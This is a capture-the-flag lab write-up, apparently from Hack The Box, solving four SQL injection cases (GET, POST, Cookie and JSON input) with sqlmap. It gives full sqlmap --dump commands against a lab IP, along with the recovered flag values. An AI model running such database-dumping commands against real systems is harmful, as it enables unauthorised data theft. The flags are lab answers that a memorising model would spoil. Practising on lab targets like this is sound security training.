## Challenge 1

What's the contents of table flag2? (Case #2) 

## Solution 1

On the page there are a number of cases.

I click on `Case1` and in there it is a button `click here` - this sends me to a page where the url is `http://94.237.54.116:53907/case1.php?id=1` which tells me that it is a `GET` request.

So I put the following sqlmap command:

```sh
sqlmap -u 'http://94.237.54.116:53907/case1.php?id=1' --dump
```

And I see the result:

```sh
Database: testdb
Table: flag1
[1 entry]
+----+-----------------------------------------------------+
| id | content                                             |
+----+-----------------------------------------------------+
| 1  | HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n} |
```

But, I'm interested on the flag2 so it should be case 2. There I can put a number and submit, but the url remains `http://94.237.54.116:53907/case2.php`, so it should be a POST request. I send this request to BURP and copy the request to a file.

Then I run the sqlmap command:
```sh
sqlmap -r case2.txt --batch --dump
```

and I got the result, which is `HTB{700_much_c0n6r475_0n_p057_r3qu357}`.

## Challenge 2

What's the contents of table flag3? (Case #3)

## Solution 2

When I click now on Case 3 there is a text `Detect and exploit SQLi vulnerability in Cookie value id=1` and also a button `click here`, and when I do that, it shows me some data for a person with the `id = 1` and the url remains the same.

When I check that on Burp I see that the value is set up on the headers, on the Cookie, and now it is as `Cookie: id=1`.

Let's save the request as a file.

I execute the following sqlmap command specifying the header that we want to test and exploit:

```sh
python sqlmap.py -r ../case3.txt -p cookie --batch --dump
```

and I got the result, which shows me the flag as:

```sh
+----+------------------------------------------+
| id | content                                  |
+----+------------------------------------------+
| 1  | HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475} |
+----+------------------------------------------+
```

## Challenge 3

What's the contents of table flag4? (Case #4)

## Solution 3


When I click on Case4, it shows me the following text:

```sh
Detect and exploit SQLi vulnerability in JSON data {"id": 1}
```

Let's just use the previous method of saving the request from Burp, and starting the SQLMap on it.

so with the command:

```sh
python sqlmap.py -r ../case4.txt --dump
```

I got the result:

```sh
+----+---------------------------------+
| id | content                         |
+----+---------------------------------+
| 1  | HTB{j450n_v00rh335_53nd5_6r475} |
+----+---------------------------------+
```

